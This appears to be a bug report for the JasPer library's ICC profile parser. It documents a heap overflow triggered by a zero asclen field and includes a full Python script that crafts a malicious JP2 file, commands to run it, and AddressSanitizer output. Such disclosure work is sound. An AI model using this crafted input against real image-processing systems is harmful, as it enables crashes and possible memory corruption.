## Bug0: Heap OOB write in jas_icctxtdesc_input when asclen is zero

In `jas_icctxtdesc_input()` (`src/libjasper/base/jas_icc.c`, around line 1108), the attacker-controlled field `asclen` is read as an unsigned 32-bit value from the ICC profile stream and no check is performed to reject a value of zero before computing `txtdesc->ascdata[txtdesc->asclen - 1] = '\0'`, so when `asclen` is zero the unsigned subtraction wraps to `UINT_FAST32_MAX` and a one-byte write is performed at an address far past the heap allocation causing a heap buffer overflow.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT_FILE = "poc_input.jp2"


def box(type4b, payload):
    total = 8 + len(payload)
    return struct.pack(">I", total) + type4b + payload


def build_icc_profile():
    PROFILE_SIZE = 128 + 4 + 12 + 90  # 234

    hdr  = struct.pack(">I", PROFILE_SIZE)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x02100000)
    hdr += struct.pack(">I", 0x6D6E7472)
    hdr += struct.pack(">I", 0x52474220)
    hdr += struct.pack(">I", 0x58595A20)
    hdr += struct.pack(">HHHHHH", 2024, 1, 1, 0, 0, 0)
    hdr += struct.pack(">I", 0x61637370)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">I", 0x00000000)
    hdr += struct.pack(">Q", 0)
    hdr += struct.pack(">I", 0)
    hdr += struct.pack(">iii", 0x0000F6D6, 0x00010000, 0x0000D32D)
    hdr += struct.pack(">I", 0)
    hdr += b'\x00' * 44
    assert len(hdr) == 128

    tag_count = struct.pack(">I", 1)

    TAG_SIG  = 0x64657363
    TAG_OFF  = 128 + 4 + 12
    TAG_SIZE = 90
    tag_table = struct.pack(">III", TAG_SIG, TAG_OFF, TAG_SIZE)

    tag_data  = struct.pack(">II", TAG_SIG, 0)
    tag_data += struct.pack(">I", 0)        # asclen = 0  <-- triggers bug
    tag_data += struct.pack(">I", 0)        # uclangcode
    tag_data += struct.pack(">I", 0)        # uclen = 0
    tag_data += struct.pack(">H", 0)        # sccode
    tag_data += struct.pack(">B", 0)        # maclen
    tag_data += b'\x00' * 67               # macdata
    assert len(tag_data) == 90

    return hdr + tag_count + tag_table + tag_data


CODESTREAM_BYTES = bytes.fromhex(
    "ff4fff51002c000000000020000000200000000000000000"
    "000000200000002000000000000000000002070101030101"
    "ff52000c00000001000504040001"
    "ff5c001320485050585050585050585050504848"
    "50ff64001100014b616b6164752d76352e322e31"
    "ff90000a00000000007c0001"
    "ff93c7d4040198c7d4040850a7e00406f3cfc008"
    "043da3ed04000c17c983c7da06000d0211a1f502"
    "8000cfd55d30c3ea0600221a0862fe7aa0f9c480"
    "3e62a2ad886db1e167c1f38b0036a199ae63a335"
    "68ebc4d2a0f904009d96a901042b10d8c1f20c00"
    "5fa7c788a00db060e8067de3ffd9"
)


def build_jp2():
    jp_sig = box(b"jP  ", struct.pack(">I", 0x0D0A870A))

    ftyp_payload = b"jp2 " + struct.pack(">I", 0) + b"jp2 "
    ftyp = box(b"ftyp", ftyp_payload)

    ihdr_payload = struct.pack(">IIHBBBB", 32, 32, 2, 0xff, 7, 1, 0)
    ihdr = box(b"ihdr", ihdr_payload)

    icc_data = build_icc_profile()
    colr_payload = struct.pack("BBB", 2, 0, 0) + icc_data
    colr = box(b"colr", colr_payload)

    jp2h = box(b"jp2h", ihdr + colr)

    jp2c_len = 8 + len(CODESTREAM_BYTES)
    jp2c = struct.pack(">I", jp2c_len) + b"jp2c" + CODESTREAM_BYTES

    return jp_sig + ftyp + jp2h + jp2c


if __name__ == "__main__":
    data = build_jp2()
    with open(OUT_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000090f at pc 0x564ee236b83d bp 0x7ffd793a0580 sp 0x7ffd793a0570
WRITE of size 1 at 0x50200000090f thread T0
    #0 0x564ee236b83c in jas_icctxtdesc_input (imginfo+0x6f283c)
    #1 0x564ee2390d1b in jas_iccprof_load (imginfo+0x717d1b)

### Impact

An attacker who supplies a crafted JP2 file with an embedded ICC profile containing a `desc` tag with `asclen` set to zero can trigger an unconditional one-byte write at an address offset of `UINT_FAST32_MAX` bytes past a heap allocation, reliably causing a heap buffer overflow and process crash. Any application or pipeline that invokes `imginfo` on untrusted JP2 input is exposed to this denial-of-service condition with no authentication or special privilege required. On platforms where such a distant address falls within a mapped writable region, the primitive could theoretically be used for memory corruption leading to arbitrary code execution, though in practice this requires very specific memory layout conditions.
